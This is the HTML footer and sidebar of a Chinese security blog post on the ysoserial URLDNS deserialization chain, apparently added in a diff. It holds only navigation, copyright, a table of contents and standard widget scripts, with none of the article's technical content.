+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/" title="ysoserial URLDNS">http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/09/12/PenetrationTesting/" rel="next" title="渗透测试小技巧">
+                <i class="fa fa-chevron-left"></i> 渗透测试小技巧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/09/26/springMVC/" rel="prev" title="springMVC">
+                springMVC <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-分析"><span class="nav-number">2.</span> <span class="nav-text">0x02 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-反序列化分析"><span class="nav-number">3.</span> <span class="nav-text">0x03 反序列化分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-解决序列化时遗留的问题"><span class="nav-number">4.</span> <span class="nav-text">0x04 解决序列化时遗留的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、为什么要创建URLStreamHandler-对象，URL对象中默认的URLStreamHandler-对象不香吗。"><span class="nav-number">4.1.</span> <span class="nav-text">1、为什么要创建URLStreamHandler 对象，URL对象中默认的URLStreamHandler 对象不香吗。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、为什么要设置URL对象中的成员变量hashCode值为-1。"><span class="nav-number">4.2.</span> <span class="nav-text">2、为什么要设置URL对象中的成员变量hashCode值为-1。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-总结"><span class="nav-number">5.</span> <span class="nav-text">0x05 总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
